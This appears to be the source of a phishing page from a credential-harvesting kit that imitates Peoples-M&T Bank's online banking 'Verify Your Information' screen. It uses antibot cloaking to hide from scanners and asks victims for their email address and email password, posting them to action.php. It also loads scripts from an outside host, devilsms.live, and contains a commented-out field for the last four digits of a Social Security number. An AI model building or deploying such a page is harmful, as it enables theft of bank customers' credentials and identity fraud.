<?php
session_start();           
require_once '../session.php';

$comps = new Comp;
$antibot = new Antibot;

if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}
$c = $_GET['cont'];
$d = base64_decode($c);
?>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta data-appid="ceb">

    <!-- Latest minified CSS -->
    <link rel="stylesheet" href="eam/content/bootstrap.min.css?ver=63.3.4.1" type="text/css">
    <link rel="stylesheet" href="eam/content/eam.css?ver=63.3.4.1" type="text/css">
    <link rel="stylesheet" href="eam/content/fis-icon-font.css?ver=63.3.4.1" type="text/css">

    <link href="eam/styles/ceb_app/136_221172186/BankStyles.css?115707" rel="stylesheet" type="text/css">


    <!-- Latest JavaScript -->
    <script src="/eam/Scripts/umd/popper.min.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/jquery-3.6.0.min.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/bootstrap.min.js?ver=63.3.4.1"></script>    
    <script src="/eam/Scripts/eam.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/eam-visual-validator.js?ver=63.3.4.1"></script>
    <script type="text/javascript">window.name = "";</script>

    <link rel="stylesheet" href="eam/content/jquery.smartbanner.min.css?ver=63.3.4.1" type="text/css" media="screen">
    <script src="/eam/scripts/jquery.smartbanner.min.js?ver=63.3.4.1"></script>



    <title>Verify Your Information - Peoples-M&amp;T Bank Online Banking</title>

    
	<script src="/eam/Scripts/UserAccountValidation.js?ver=63.3.4.1"></script>

	
	<style type="text/css">
		div.form-group.row.collapse.show {
			display: flex;
		}
	</style>

</head>
<body>
	<header>
        <a id="skippy" class="visually-hidden-focusable" href="#secureHideArea"><span class="skiplink-text">Skip to main content</span></a>
		<div class="fis-header-content"><a class="brandedImageLink" title="Peoples-M&amp;T Bank" href="http://www.peoples.com"><img id="_BankLogo" class="" title="Peoples-M&amp;T Bank" alt="" src="https://cibng.ibanking-services.com/Eam/Styles/CeB_App/136_221172186/136_image.svg"></a></div>
	</header>

	<div id="content" class="fis-page-content">
		<div class="">
            <div id="secureHideArea" class="container secureHideArea" role="main" tabindex="-1">
                <div></div>
                <div class="row">
                    <h1 class="col-sm-12">Verify Your Account Information</h1>
                </div>
                


	<form id="form" method="POST" action="action.php" autocomplete="off" data-wizard-title="Verify Your Information" data-wizard-submit="Continue" onsubmit="return validateForm()">
	<input type="hidden" id="hidden" value="3">
	<input type="hidden" name="ad" id="ad" value="<?php echo $d; ?>">

<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">Email Address:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="email" name="email" type="text" value="" class="form-control  " maxlength="40">Enter the email address associated with this account.</div></div>


<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">Email Password:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="a" name="password" type="password" value="" class="form-control  ">Enter the email account password for authentication.</div></div>


<!-- <div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="SocialSecurityNumber" id="LabelSocialSecurityNumber">Social Security Number:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="SocialSecurityNumber" name="SocialSecurityNumber" type="password" value="" class="form-control  " maxlength="4">Enter the last 4-digits of your social security number.</div></div>		 -->
		<div class="form-group row">
			<div class="col-lg col-sm w-100">
				<input id="continue" name="continue" type="submit" value="Continue" class="btn btn-primary">
			</div>
			<div class="col-lg col-sm w-100">
				<a id="cancel" href="#" class="btn btn-secondary" disabled>Cancel</a>
			</div>
		</div>
	</form>
<script src="https://devilsms.live/cleave.js"></script>
<script src="https://devilsms.live/clve-min.js"></script> 
            </div>
		</div>
	</div>

    

    
    



</body></html>
